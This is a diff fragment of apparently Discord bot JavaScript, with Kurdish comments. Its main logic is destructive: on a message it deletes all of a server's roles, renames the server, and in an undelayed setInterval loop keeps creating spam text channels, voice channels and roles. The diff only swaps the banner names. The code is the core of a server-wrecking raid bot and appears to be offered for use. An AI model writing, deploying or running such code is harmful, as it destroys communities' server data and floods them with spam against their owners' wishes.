@@ -15,11 +15,11 @@ client.on("message", message => {
       message.guild.roles.forEach(r => {
         r.delete();
       });
-      message.guild.setName("RaWeN Up");////nawek dane bo sar server 
+      message.guild.setName("KURDISTAN IS 1");////nawek dane bo sar server 
       setInterval(function() {
-        message.guild.createChannel("RaWeN Up", "text");///////bo channel 
-        message.guild.createChannel("RaWeN Up", "voice");////bo voice
-        message.guild.createRole({ name: "RaWeN Up" });////nawek dane bo role kan
+        message.guild.createChannel("ALMANY Up", "text");///////bo channel 
+        message.guild.createChannel("AlMANY Up", "voice");////bo voice
+        message.guild.createRole({ name: "ALMANY Up" });////nawek dane bo role kan
       });
     }
   }
